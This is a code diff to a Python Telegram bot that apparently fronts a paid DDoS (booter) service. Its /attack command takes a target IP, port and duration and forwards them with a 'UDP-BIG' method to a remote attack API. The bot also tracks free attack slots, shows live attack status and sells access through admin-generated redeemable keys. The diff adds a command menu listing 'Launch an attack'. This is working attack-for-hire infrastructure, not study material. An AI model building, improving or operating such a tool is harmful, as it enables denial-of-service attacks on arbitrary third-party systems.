@@ -8,7 +8,7 @@ import threading
 import requests
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from datetime import datetime, timedelta
-from telegram import Update
+from telegram import Update, BotCommand, BotCommandScopeDefault, BotCommandScopeChat
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # ---------- CONFIGURATION ----------
@@ -20,18 +20,17 @@ BASE_URL = os.environ.get(
     "BASE_URL",
     "https://discretion-applicant-gamma-sized.trycloudflare.com/api/attack"
 )
-# Slots endpoint - override via env if different (e.g. /api/status, /api/slots)
 SLOTS_URL = os.environ.get(
     "SLOTS_URL",
     "https://discretion-applicant-gamma-sized.trycloudflare.com/api/slots"
 )
-SLOTS_CACHE_TTL = 4  # seconds - avoid hammering the API on every status edit
+SLOTS_CACHE_TTL = 4
 
 DEFAULT_METHOD = os.environ.get("DEFAULT_METHOD", "UDP-BIG")
 MAX_DURATION = 300
 COOLDOWN_SECONDS = 3
 ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8508604294"))
-STATUS_UPDATE_INTERVAL = 5   # auto-refresh status every 5 seconds
+STATUS_UPDATE_INTERVAL = 5
 DATA_FILE = os.environ.get("DATA_FILE", "data.json")
 
 # ---------- GLOBAL STATE ----------
@@ -42,7 +41,6 @@ user_data = {}
 keys = {}
 subscriptions = {}
 
-# Slots cache
 _slots_cache = {"data": None, "ts": None}
 
 # ---------- LOGGING ----------
@@ -71,7 +69,6 @@ class HealthHandler(BaseHTTPRequestHandler):
 
 
 def start_web_server():
-    """Start a tiny HTTP server so Render's health check passes."""
     port = int(os.environ.get("PORT", 8080))
     try:
         server = ThreadingHTTPServer(("0.0.0.0", port), HealthHandler)
@@ -85,7 +82,6 @@ def start_web_server():
 
 
 async def keep_alive_loop():
-    """Ping our own public URL periodically so Render free tier doesn't sleep."""
     external_url = os.environ.get("RENDER_EXTERNAL_URL")
     if not external_url:
         logger.info("RENDER_EXTERNAL_URL not set - keep-alive pings disabled.")
@@ -102,31 +98,23 @@ async def keep_alive_loop():
 
 # ---------- SLOT FETCHING ----------
 def _extract_slots(data):
-    """
-    Try to pull available/total slots from a variety of common JSON shapes.
-    Returns (available, total) or (None, None) if not found.
-    """
     if not isinstance(data, dict):
         return None, None
 
-    # Some APIs wrap payload under "data" or "result"
     payload = data
     for wrapper in ("data", "result", "response", "slots"):
         if isinstance(data.get(wrapper), dict):
             payload = data[wrapper]
             break
 
-    # Common key names for available
     avail_keys = [
         "available", "available_slots", "free", "free_slots",
         "slots_available", "slots_free", "open", "remaining"
     ]
-    # Common key names for total
     total_keys = [
         "total", "total_slots", "slots_total", "capacity",
         "max", "max_slots", "limit"
     ]
-    # Common key names for in-use
     used_keys = [
         "used", "used_slots", "in_use", "running", "busy", "active"
     ]
@@ -138,28 +126,24 @@ def _extract_slots(data):
     for k in avail_keys:
         if k in payload:
             try:
-                available = int(payload[k])
-                break
+                available = int(payload[k]); break
             except (TypeError, ValueError):
                 pass
 
     for k in total_keys:
         if k in payload:
             try:
-                total = int(payload[k])
-                break
+                total = int(payload[k]); break
             except (TypeError, ValueError):
                 pass
 
     for k in used_keys:
         if k in payload:
             try:
-                used = int(payload[k])
-                break
+                used = int(payload[k]); break
             except (TypeError, ValueError):
                 pass
 
-    # Derive missing values
     if available is None and total is not None and used is not None:
         available = max(0, total - used)
     if total is None and available is not None and used is not None:
@@ -171,10 +155,6 @@ def _extract_slots(data):
 
 
 async def fetch_slots(force=False):
-    """
-    Fetch slot info from SLOTS_URL with a small cache.
-    Returns (available, total) or (None, None) on failure.
-    """
     now = datetime.now()
     if (
         not force
@@ -279,16 +259,13 @@ def format_duration(seconds):
     parts = []
     days = seconds // 86400
     if days:
-        parts.append(f"{days}d")
-        seconds %= 86400
+        parts.append(f"{days}d"); seconds %= 86400
     hours = seconds // 3600
     if hours:
-        parts.append(f"{hours}h")
-        seconds %= 3600
+        parts.append(f"{hours}h"); seconds %= 3600
     minutes = seconds // 60
     if minutes:
-        parts.append(f"{minutes}m")
-        seconds %= 60
+        parts.append(f"{minutes}m"); seconds %= 60
     if seconds:
         parts.append(f"{seconds}s")
     return " ".join(parts) if parts else "0s"
@@ -321,7 +298,6 @@ def format_completion(target, port, duration):
 
 
 def format_slots_line(available, total):
-    """Pretty slot line used in /status."""
     if available is None or total is None:
         return "🟡 𝗦𝗟𝗢𝗧𝗦: Unknown (server did not respond)"
     used = max(0, total - available)
@@ -406,8 +382,7 @@ async def update_status_message(context: ContextTypes.DEFAULT_TYPE):
     if user_id not in user_data or not user_data[user_id].get("active"):
         try:
             await context.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
+                chat_id=chat_id, message_id=message_id,
                 text="✅ Your attack has finished."
             )
         except Exception:
@@ -427,8 +402,7 @@ async def update_status_message(context: ContextTypes.DEFAULT_TYPE):
             user_data[user_id]["status_job"] = None
         try:
             await context.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
+                chat_id=chat_id, message_id=message_id,
                 text="✅ Your attack has finished."
             )
         except Exception:
@@ -437,16 +411,11 @@ async def update_status_message(context: ContextTypes.DEFAULT_TYPE):
         return
 
     user_name = job.data.get("user_name", "Hacker")
-
-    # Fetch live slots from server
     available, total = await fetch_slots()
-
     status_text = format_status_active(attack, user_name, available, total)
     try:
         await context.bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=status_text
+            chat_id=chat_id, message_id=message_id, text=status_text
         )
     except Exception as e:
         logger.error(f"Failed to edit status message: {e}")
@@ -539,23 +508,17 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     args = context.args
     if len(args) != 1:
-        await update.message.reply_text(
-            "❌ Invalid format.\nUsage: /redeem <key>"
-        )
+        await update.message.reply_text("❌ Invalid format.\nUsage: /redeem <key>")
         return
 
     key = args[0]
     if key not in keys:
-        await update.message.reply_text(
-            "❌ Invalid key. Please check and try again."
-        )
+        await update.message.reply_text("❌ Invalid key. Please check and try again.")
         return
 
     key_data = keys[key]
     if key_data["used_by"] is not None:
-        await update.message.reply_text(
-            "❌ This key has already been used."
-        )
+        await update.message.reply_text("❌ This key has already been used.")
         return
 
     duration = key_data["duration"]
@@ -596,10 +559,7 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
 
-    keys[key] = {
-        "duration": duration,
-        "used_by": None
-    }
+    keys[key] = {"duration": duration, "used_by": None}
     save_data()
 
     duration_str = format_duration(duration)
@@ -648,9 +608,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     args = context.args
     if len(args) < 3:
-        await update.message.reply_text(
-            "☣️  Usage: /attack <ip> <port> <duration>"
-        )
+        await update.message.reply_text("☣️  Usage: /attack <ip> <port> <duration>")
         return
 
     target = args[0]
@@ -677,12 +635,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Duration must be a positive integer (seconds).")
         return
 
-    params = {
-        "host": target,
-        "port": port,
-        "time": duration,
-        "method": method
-    }
+    params = {"host": target, "port": port, "time": duration, "method": method}
 
     try:
         response = await asyncio.to_thread(
@@ -705,17 +658,13 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         now = datetime.now()
         attack_info = {
-            "target": target,
-            "port": port,
-            "duration": duration,
-            "method": method,
-            "start_time": now
+            "target": target, "port": port, "duration": duration,
+            "method": method, "start_time": now
         }
         user_data[user_id]["last_finish_time"] = None
         user_data[user_id]["active"] = attack_info
         user_data[user_id]["completion_sent"] = False
 
-        # Invalidate slot cache so next fetch is fresh
         _slots_cache["data"] = None
         _slots_cache["ts"] = None
 
@@ -798,15 +747,68 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ An error occurred while fetching status. Please try again.")
 
 
+# ---------- BOT MENU ----------
+DEFAULT_COMMANDS = [
+    BotCommand("start",  "🚀 Start the bot"),
+    BotCommand("attack", "⚔️ Launch an attack"),
+    BotCommand("status", "📊 Live attack progress"),
+    BotCommand("redeem", "🔑 Redeem an access key"),
+    BotCommand("help",   "📖 Show help menu"),
+]
+
+ADMIN_COMMANDS = [
+    BotCommand("start",  "🚀 Start the bot"),
+    BotCommand("attack", "⚔️ Launch an attack"),
+    BotCommand("status", "📊 Live attack progress"),
+    BotCommand("genkey", "⚙️ Generate an access key"),
+    BotCommand("help",   "📖 Show help menu"),
+]
+
+
+async def setup_bot_menu(application):
+    """
+    Register commands with Telegram so the side menu (☰ button) updates
+    automatically on every startup.
+
+    - Default scope: commands shown to all regular users.
+    - Admin scope  : extra /genkey command, only visible to ADMIN_USER_ID.
+    """
+    bot = application.bot
+
+    # Default command menu (everyone)
+    try:
+        await bot.set_my_commands(
+            commands=DEFAULT_COMMANDS,
+            scope=BotCommandScopeDefault()
+        )
+        logger.info("Default bot menu registered.")
+    except Exception as e:
+        logger.error(f"Failed to set default bot menu: {e}")
+
+    # Admin command menu (only for the admin chat)
+    try:
+        await bot.set_my_commands(
+            commands=ADMIN_COMMANDS,
+            scope=BotCommandScopeChat(chat_id=ADMIN_USER_ID)
+        )
+        logger.info("Admin bot menu registered.")
+    except Exception as e:
+        logger.error(f"Failed to set admin bot menu: {e}")
+
+
 # ---------- MAIN ----------
 async def post_init(application):
-    """Runs after the application is initialized (inside the running loop)."""
+    """
+    Runs after the application is initialized (inside the running loop).
+    - Registers the bot command menu with Telegram (auto-updates on side menu).
+    - Kicks off the Render keep-alive loop.
+    """
+    await setup_bot_menu(application)
     asyncio.create_task(keep_alive_loop())
 
 
 def main():
     load_data()
-
     start_web_server()
 
     app = (
